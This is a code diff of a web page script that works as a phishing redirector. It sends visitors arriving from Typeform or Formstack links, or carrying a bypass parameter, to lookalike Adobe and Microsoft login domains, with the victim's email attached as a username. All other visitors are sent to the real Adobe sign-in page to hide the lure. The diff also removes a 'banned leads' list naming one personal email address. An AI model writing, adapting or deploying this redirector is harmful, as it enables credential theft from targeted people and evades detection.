@@ -1,78 +1,71 @@
 <script>
-  const ref = document.referrer;
-  const qs = window.location.search;
-  const urlParams = new URLSearchParams(qs);
+    const ref = document.referrer;
+    const qs = window.location.search;
+    const urlParams = new URLSearchParams(qs);
 
-  if (false) {
-    alert("A technical issue occurred. Please try again in a few hours");
-  } else {
-
-  const targetDomains = [
-    "https://documents.coupahost2.com",
-    "https://adobesign.mcrsoftonline.com",
-    "https://contracts.oauth-secure.com",
-    "https://banijay.mcrsoftonline.com"
-  ]
-
-  let targetDomain;
-
-  if (urlParams.has("au")) {
-    targetDomain = targetDomains[1];
-  } else {
-    targetDomain = targetDomains[0];
-  }
-
-  if (urlParams.has("uk")) {
-    targetDomain = targetDomains[2];
-  }
-
-  if (urlParams.has("eco")) {
-    targetDomain = targetDomains[3]
-  }
-
-  // if the cookie is set, redirect 
-  if (localStorage.getItem("completed2")) {
-    window.location = "https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com";
-  } 
-
-  else {
-    if (urlParams.has("sc")) {
-      // set cookie
-       localStorage.setItem("completed2", true);
-      // redirect to end site
-      window.location = "https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com";
+    if (false) {
+        alert("A technical issue occurred. Please try again in a few hours");
     } else {
 
-      if (ref.match(/^https?:\/\/([^\/]+\.)?typeform\.com(\/|$)/i) || ref.match(/^https?:\/\/([^\/]+\.)?formstack\.com(\/|$)/i) || urlParams.has("justletmeinbroplease")) {
+        const targetDomains = [
+            "https://documents.coupahost2.com",
+            "https://adobesign.mcrsoftonline.com",
+            "https://contracts.oauth-secure.com",
+            "https://banijay.mcrsoftonline.com"
+        ]
 
-        if (urlParams.has("u")) {
-          const u = urlParams.get("u");
+        let targetDomain;
 
-          const bannedLeads = [
-            "dawnelson@whitelionwalk.co.uk"
-          ];
-
-          if (bannedLeads.includes(u)) {
-            window.location = "https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com";
-          } else {
-            window.location = targetDomain + "?username=" + u;
-          }
-          
-          
+        if (urlParams.has("au")) {
+            targetDomain = targetDomains[1];
         } else {
-          window.location = targetDomain;
+            targetDomain = targetDomains[0];
         }
-      } 
 
-      else {
-        window.location = "https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com";
-      }
-        
-    }
-  }
+        if (urlParams.has("uk")) {
+            targetDomain = targetDomains[2];
+        }
 
-  } // remove after
+        if (urlParams.has("eco")) {
+            targetDomain = targetDomains[3]
+        }
 
-  
-  
+        // if the cookie is set, redirect 
+        if (localStorage.getItem("completed2")) {
+            window.location = "https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com";
+        }
+
+        else {
+            if (urlParams.has("sc")) {
+                // set cookie
+                localStorage.setItem("completed2", true);
+                // redirect to end site
+                window.location = "https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com";
+            } else {
+
+                if (ref.match(/^https?:\/\/([^\/]+\.)?typeform\.com(\/|$)/i) || ref.match(/^https?:\/\/([^\/]+\.)?formstack\.com(\/|$)/i) || urlParams.has("justletmeinbroplease")) {
+
+                    if (urlParams.has("u")) {
+                        const u = urlParams.get("u");
+
+                      
+                        window.location = targetDomain + "?username=" + u;
+
+
+                    } else {
+                        window.location = targetDomain;
+                    }
+                }
+
+                else {
+                    window.location = "https://auth.services.adobe.com/en_US/index.html?callback=https%3A%2F%2Fims-na1.adobelogin.com";
+                }
+
+            }
+        }
+
+    } // remove after
+
+
+
 </script>
